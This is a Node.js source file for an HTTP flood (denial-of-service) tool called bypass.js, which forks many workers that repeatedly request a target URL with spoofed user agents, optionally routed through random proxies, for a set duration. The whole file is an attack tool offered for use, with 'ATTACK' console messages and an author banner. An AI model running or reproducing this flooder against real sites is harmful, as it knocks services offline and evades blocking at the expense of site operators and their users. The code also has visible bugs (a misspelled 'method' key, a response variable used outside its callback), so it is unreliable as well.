require('events').EventEmitter.defaultMaxListeners = 0;
const request = require('request')
const fakeUa = require('fake-useragent')
const fs = require('fs')
const cluster = require('cluster')


function mainprocess(){
    Array.prototype.remove_by_value = function(val) {
        for (var i = 0; i < this.length; i++) {
        if (this[i] === val) {
            this.splice(i, 1);
            i--;
        }
        }
        return this;
    }
    if (process.argv.length != 6){
        console.log("USAGE : node bypass.js url thread time raw/proxy")
       
        console.log(`
        ▄▀▀█▄▄▄▄  ▄▀▀█▄▄▄▄  ▄▀▀▀▀▄     
        ▐  ▄▀   ▐ ▐  ▄▀   ▐ █ █   ▐     
          █▄▄▄▄▄    █▄▄▄▄▄     ▀▄       
          █    ▌    █    ▌  ▀▄   █      
         ▄▀▄▄▄▄    ▄▀▄▄▄▄    █▀▀▀       
         █    ▐    █    ▐    ▐          
         ▐         ▐                    
    `)
    console.log("EXEMP: node bypass.js https://google.com 10 1000 raw/proxy")
        process.exit()
    

    }
    
    else{
        
        if (process.argv[5]=='raw'){
            console.log('ATTACK RAW')
        }
        else if(process.argv[5]=='proxy'){
            console.log('ATTACK PROXY')
        }
        else{
            console.log("ERROR !!!!")
            console.log("SELECT RAW AND PROXY")
            process.exit()
        }
        function run(){
            if (process.argv[5] == 'raw'){
                
                var http={
                    url:process.argv[2],
                    medthod:'get',
                    headers:{
                        'user-agent':fakeUa(),
                        'Cache-Control': 'no-cache'
                    }
                }
                request(http,function(e,r){
                    console.log("ATTACK TO ",process.argv[2],'STATUS CODE',r.statusCode,r.statusMessage)
                })
                if (r.statusCode > 226){
                    request(http)
                }

            }
            else if(process.argv[5] == 'proxy'){
                
                var proxies = fs.readFileSync('proxies.txt', 'utf-8').replace(/\r/g, '').split('\n'); 
                var proxy = proxies[Math.floor(Math.random()* proxies.length)]
                proxyrequests = request.defaults({'proxy':'http://'+proxy})
                var config={
                    url:process.argv[2],
                    medthod:'get',
                    headers:{
                        'user-agent':fakeUa(),
                        'Cache-Control': 'no-cache'

                    }
                }
                proxyrequests(config,function(e,r){
                    console.log('STATUS CODE',r.statusCode,r.statusMessage)
                })
                if (proxies.length == 0) {
                    process.exit(0);
                }
                
                if (r.statusCode >= 200 && r.statusCode <= 226 ){
                    proxyrequests(config)
                }
                else{
                    proxies = proxies.remove_by_value(proxy)
                }
                
            }
            
            
        }
    }
    function thread(){
        setInterval(()=>{
            run()
        })
    }
    function main(){
    if (cluster.isMaster){
        for (let i=0;i<process.argv[3];i++){
            cluster.fork()
            console.log("CREAT BY EES !! ")
            
            
            
        }
    cluster.on(function(){
        cluster.fork()
    })
    }
    else{
        thread()
    }
    }
main()    
   
}
process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});
setTimeout(()=>{
    console.log("ATTACK TIME OUT !!!")
    process.exit()
},process.argv[4] * 1000)
mainprocess()